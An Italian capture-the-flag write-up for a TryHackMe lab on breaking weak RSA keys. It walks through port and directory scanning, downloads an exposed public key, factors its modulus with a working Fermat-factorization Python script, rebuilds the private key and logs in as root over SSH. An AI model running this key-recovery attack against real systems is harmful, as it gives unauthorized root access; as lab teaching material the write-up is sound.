
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/breakrsa


```
sudo nmap -Pn -p- 10.10.191.169 -vvv
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```
sudo nmap -sVC -v -p22,80 10.10.191.169
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Jack Of All Trades
MAC Address: 02:19:7A:72:35:07 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Quanti servizi sono in esecuzione sul box?
```
2
```

Qual è il nome della directory nascosta sul server web?
```
gobuster dir -u http://10.10.191.169 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
/development          (Status: 301) [Size: 178] [--> http://10.10.191.169/development/]
/index.html           (Status: 200) [Size: 384]
Progress: 4614 / 4615 (99.98%)

```

```
development
```

```
http://10.10.191.169/development/
```

```
http://10.10.191.169/development/id_rsa.pub
```
Qual è la lunghezza della chiave RSA scoperta? (in bit)
```
4096
```

Quali sono le ultime 10 cifre di n? (dove 'n' è il modulo della coppia di chiavi pubblica-privata)

```
http://10.10.191.169/development/log.txt
```

```
The library we are using to generate SSH keys implements RSA poorly. The two
randomly selected prime numbers (p and q) are very close to one another. Such
bad keys can easily be broken with Fermat's factorization method.

Also, SSH root login is enabled.

<https://github.com/murtaza-u/zet/tree/main/20220808171808>

```
**chiave RSA privata può essere acquisita tramite il metodo di fattorizzazione di Fermat**

```
pip install pycryptodome
```

creiamo uno script in python nella stessa cartella dove c'è il file id_rsa.pub scaricato

```
nano fattorizzazione.py
```
```
#!/usr/bin/env python3

from Crypto.PublicKey import RSA

with open('id_rsa.pub', 'r') as file:
    public_key = RSA.importKey(file.read())  # Assicurati di usare importKey

bit_size = public_key.size()  # Cambia size_in_bits in size()
n = public_key.n
x = str(n)[-10:]

print(f"La dimensione in bit della chiave pubblica è: {bit_size}")
print(f"Gli ultimi 10 cifre della chiave pubblica sono: {x}")

```

```
python3 fattorizzazione.py
```

```
root@ip-10-10-15-58:~# python3 fattorizzazione.py
La dimensione in bit della chiave pubblica è: 4095
Gli ultimi 10 cifre della chiave pubblica sono: 1225222383
root@ip-10-10-15-58:~# 

```
Quali sono le ultime 10 cifre di n? (dove 'n' è il modulo della coppia di chiavi pubblica-privata)
```
1225222383
```

Scomponi n nei numeri primi p e q

creiamo questo script più completo
```
nano fattorizzazione2.py
```
```
#!/usr/bin/env python3

from Crypto.PublicKey import RSA

from gmpy2 import isqrt, invert, lcm

def factorize(n):
    # poiché i numeri pari sono sempre divisibili per 2, uno dei fattori sarà sempre 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt restituisce la radice quadrata intera di n
    a = isqrt(n)

    # se n è un quadrato perfetto, i fattori saranno (sqrt(n), sqrt(n))
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b


def get_private_key(e, p, q):
    return invert(e, lcm(p - 1, q - 1))


with open('id_rsa.pub', 'r') as file:
    public_key = RSA.import_key(file.read())

bit_size = public_key.size_in_bits()
n = public_key.n
x = str(n)[-10:]

e = 65537
p, q = factorize(n)

d = get_private_key(e, p, q)

private_key = RSA.construct((n ,e , int(d)))

with open('id_rsa', 'wb') as file:
    file.write(private_key.export_key('PEM'))

print(f"The size in bits of the public key is: {bit_size}")
print(f"The last 10 digits of the public key are: {x}")
print(f"The difference between p and q is: {p - q}")

print(f"The value of the private key is {d}")
print("You can find your key in this directory.")

```


```
python3 fattorizzazione2.py
```

```
root@ip-10-10-15-58:~# python3 fattorizzazione2.py
The size in bits of the public key is: 4096
The last 10 digits of the public key are: 1225222383
The difference between p and q is: 1502
The value of the private key is 355800651425135681183390707128108943722411746130741264046675581161020732554780741656912077045552316250703809090954928640931547581315194819458963160110120922414848114847301699090523885005384262610482079782617179276603225871047383152843460146236246419421648466520894698339133117031948242676251882103774390399143617061031502081556812701001453097227818768422703191949841125871910183204731160170789011284878230235436521793393724471383499879219675769700014447675151926209318073223612943831612223524959548771170877787184798441930486061891613062347672989812669710963541034708669406007894705151093105784054091751650933323300985495149924416659229876914076648270045676997650015615996341370380597228469755128170040353433374999020283706184957220148628008445610267702031710365117500478110172685332610159706254466309767816421842113204954137883347698932245158527034600826313156623260808181115243968071291416762806090766691780165333622281350406073396430046330125424011836635616883856583961232702990430895725627105993091471281133235092845210740773088363495356096518772606314489088890124113092286827052036690187298835257796804255669912241916692428526192173280096699373626286648150269450291733933394106397510904039580604434322844051351031280613818868793
You can find your key in this directory.

```
lo script crea anche un file id_rsa
```bash
chmod 400 id_rsa
```
ci connettiamo come root
```bash
ssh -i id_rsa root@10.10.191.169
```

```
root@ip-10-10-191-169:~# ls
flag  snap
root@ip-10-10-191-169:~# cat flag
xxxxxxxxxxxxxxxxxxxxxx
root@ip-10-10-191-169:~# 

```
ecco la nostra flag

